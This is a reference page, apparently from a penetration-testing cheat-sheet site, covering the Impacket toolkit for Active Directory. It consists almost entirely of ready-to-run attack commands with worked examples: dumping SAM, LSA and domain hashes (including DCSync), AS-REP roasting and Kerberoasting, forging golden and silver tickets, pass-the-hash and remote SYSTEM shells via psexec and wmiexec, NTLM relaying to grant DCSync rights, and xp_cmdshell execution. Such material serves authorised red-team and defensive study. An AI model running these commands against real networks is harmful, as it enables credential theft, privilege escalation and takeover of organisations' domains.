# Impacket

> A collection of Python classes and ready-made scripts for Windows network protocols (SMB, MS-RPC, Kerberos, LDAP) — the backbone of modern Active Directory exploitation.

- Category: Active Directory
- Commands: 13
- Page: https://terminal.rokibulroni.com/tool/active-directory/impacket
- Homepage: https://github.com/fortra/impacket
- Documentation: https://github.com/fortra/impacket
- Tags: Active Directory, Kerberos, SMB, Python

## Install

- apt: `sudo apt install python3-impacket`
- pipx: `pipx install impacket`

## Credentials & hashes

### secretsdump.py <domain>/<user>:<pass>@<target>

```bash
secretsdump.py <domain>/<user>:<pass>@<target>
```

Example:

```bash
secretsdump.py corp.local/svc:Summer2026@10.10.10.5
```

Dumps SAM, LSA secrets and cached domain credentials from a host over SMB.

### secretsdump.py -just-dc <domain>/<user>@<dc>

```bash
secretsdump.py -just-dc <domain>/<user>@<dc>
```

Example:

```bash
secretsdump.py -just-dc corp.local/administrator@10.10.10.1
```

DCSync: pulls every domain hash straight from a domain controller (needs replication rights).

### secretsdump.py -just-dc-ntlm <domain>/<user>@<dc>

```bash
secretsdump.py -just-dc-ntlm <domain>/<user>@<dc>
```

Example:

```bash
secretsdump.py -just-dc-ntlm corp.local/administrator@10.10.10.1
```

Only NTLM hashes from the DC, skipping Kerberos keys.

### getTGT.py <domain>/<user> -hashes :<nt>

```bash
getTGT.py <domain>/<user> -hashes :<nt>
```

Example:

```bash
getTGT.py corp.local/svc -hashes :aad3b435b51404eeaad3b435b51404ee
```

Requests a Kerberos TGT with a password or NT hash and saves a .ccache for pass-the-ticket.


## Kerberos attacks

### GetNPUsers.py <domain>/ -usersfile <file> -no-pass -dc-ip <ip>

```bash
GetNPUsers.py <domain>/ -usersfile <file> -no-pass -dc-ip <ip>
```

Example:

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1
```

AS-REP roasting: pulls crackable hashes for accounts that do not require Kerberos pre-authentication.

### GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request

```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request
```

Example:

```bash
GetUserSPNs.py corp.local/svc:pass -dc-ip 10.10.10.1 -request
```

Kerberoasting: requests service tickets for SPN accounts and outputs hashes to crack offline.

### ticketer.py -nthash <nt> -domain-sid <sid> -domain <domain> <user>

```bash
ticketer.py -nthash <nt> -domain-sid <sid> -domain <domain> <user>
```

Example:

```bash
ticketer.py -nthash abc123 -domain-sid S-1-5-21-111-222-333 -domain corp.local Administrator
```

Forges a golden or silver ticket from the krbtgt or a service account hash.


## Remote execution

### psexec.py <domain>/<user>:<pass>@<target>

```bash
psexec.py <domain>/<user>:<pass>@<target>
```

Example:

```bash
psexec.py corp.local/administrator:pass@10.10.10.5
```

A SYSTEM shell via a temporary Windows service over SMB.

### wmiexec.py <domain>/<user>:<pass>@<target>

```bash
wmiexec.py <domain>/<user>:<pass>@<target>
```

Example:

```bash
wmiexec.py corp.local/administrator:pass@10.10.10.5
```

A semi-interactive shell over WMI, quieter than psexec.

### psexec.py -hashes :<nt> <domain>/<user>@<target>

```bash
psexec.py -hashes :<nt> <domain>/<user>@<target>
```

Example:

```bash
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/administrator@10.10.10.5
```

Pass-the-hash: authenticates with an NT hash instead of a password.


## Relaying & databases

### ntlmrelayx.py -tf <targets> -smb2support

```bash
ntlmrelayx.py -tf <targets> -smb2support
```

Example:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Relays captured NTLM authentication to other hosts; pair with Responder in analyze mode.

### ntlmrelayx.py -t ldap://<dc> --escalate-user <user>

```bash
ntlmrelayx.py -t ldap://<dc> --escalate-user <user>
```

Example:

```bash
ntlmrelayx.py -t ldap://10.10.10.1 --escalate-user lowpriv
```

Relays to LDAP to grant a controlled user DCSync rights.

### mssqlclient.py <domain>/<user>:<pass>@<target>

```bash
mssqlclient.py <domain>/<user>:<pass>@<target>
```

Example:

```bash
mssqlclient.py corp.local/sa:pass@10.10.10.9
```

Connects to MSSQL for enumeration and xp_cmdshell execution.

## Related tools

- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
- [Certipy](https://terminal.rokibulroni.com/tool/active-directory/certipy)
- [Responder](https://terminal.rokibulroni.com/tool/active-directory/responder)
- [Mimikatz](https://terminal.rokibulroni.com/tool/active-directory/mimikatz)
